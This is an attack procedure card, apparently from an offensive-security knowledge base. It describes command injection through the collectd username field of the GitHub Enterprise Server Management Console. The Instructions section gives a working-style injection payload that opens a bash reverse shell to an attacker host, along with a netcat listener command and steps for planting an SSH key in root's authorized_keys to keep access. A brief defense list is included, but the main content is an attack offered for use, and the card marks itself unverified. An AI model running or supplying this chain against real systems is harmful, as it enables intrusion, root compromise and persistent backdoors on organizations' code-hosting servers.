---
tags:
  - command-injection
  - rce
  - collectd
  - github-enterprise-server
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
commands: []
verified: false
platforms:
  - Linux
submitted: true
techniques:
  - '[[Unix Shell]]'
  - '[[Exploitation for Privilege Escalation]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 918671cb-1006-4ed6-90a0-de374eace58a
created_at: '2025-12-14T17:30:07.567Z'
updated_at: '2025-12-14T17:30:07.567Z'
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Exploitation for Privilege Escalation]]'
---
# Command-Injection-in-GitHub-Enterprise-collectd-Configuration

## Summary

This procedure exploits insufficient input validation in the GitHub Enterprise Server Management Console's collectd username and password configuration fields, allowing an authenticated editor to inject and execute arbitrary commands on the underlying Linux appliance, resulting in remote code execution and privilege escalation to root.

## Description

The vulnerability occurs when the Management Console processes user-supplied values for collectd authentication without proper sanitization, passing them directly to shell commands for configuration. An attacker with editor access can craft payloads that break out of the expected input context (e.g., using semicolons or backticks) to append malicious commands. This leads to immediate code execution during config application, often with elevated privileges due to the service's root context. The attack targets GitHub Enterprise Server appliances, enabling full compromise including data access, configuration changes, and persistent SSH backdoors.

## Requirements

1. Editor role credentials for the Management Console
2. Network access to the appliance's HTTPS management interface (default port 8443)
3. A listening server for reverse shells (e.g., netcat on attacker machine)
4. Basic knowledge of Linux shell commands for payload crafting

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization for all configuration fields, using whitelisting for usernames/passwords
- Run collectd and related services under least-privilege accounts, not root
- Enable logging of all Management Console actions and monitor for anomalous command executions in system logs (e.g., /var/log/secure)
- Use web application firewalls (WAF) to detect injection patterns in console traffic
- Regularly audit collectd configurations and restrict editor access to sensitive services

## Objectives

1. Achieve remote code execution on the GitHub Enterprise Server appliance
2. Escalate privileges from editor to root for full system control
3. Establish persistent access via SSH for ongoing exploitation

## Instructions

### Step 1: Authenticate and Navigate to collectd Configuration

**Context**: Log in to the Management Console and locate the vulnerable configuration interface to prepare for payload injection.

Navigate to `https://<appliance-ip>:8443/manage`, authenticate with editor credentials, and go to the Monitoring > collectd section. Identify the username and password fields for collectd authentication.

> Ensure the fields accept input without immediate validation errors, confirming editor edit permissions.

### Step 2: Craft and Inject Command Payload

**Context**: Construct a payload that escapes the input context and executes a malicious command, such as spawning a reverse shell.

In the username field, enter a payload like: `validuser; /bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' #` (adjust IP/port). Leave password as a valid value or inject similarly if needed. Submit the form to apply the configuration.

> The payload uses a semicolon to chain commands and a comment (#) to ignore trailing input. On submission, the system executes the injected bash command as the collectd process user (often root).

### Step 3: Capture and Escalate the Shell

**Context**: Receive the reverse shell and verify/escalate privileges to root for SSH access setup.

On your attacker machine, run a listener: `nc -lvnp 4444`. Upon config application, the shell connects. Run `whoami` to confirm root, then generate SSH keys (`ssh-keygen -t rsa`) and add your public key to `/root/.ssh/authorized_keys` for persistent root SSH access.

> Successful escalation shows root prompt; test SSH login post-setup to validate persistence.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Privilege Escalation]]

### Techniques

- [[Unix Shell]]
- [[Exploitation for Privilege Escalation]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- command-injection
- rce
- privilege-escalation
- linux
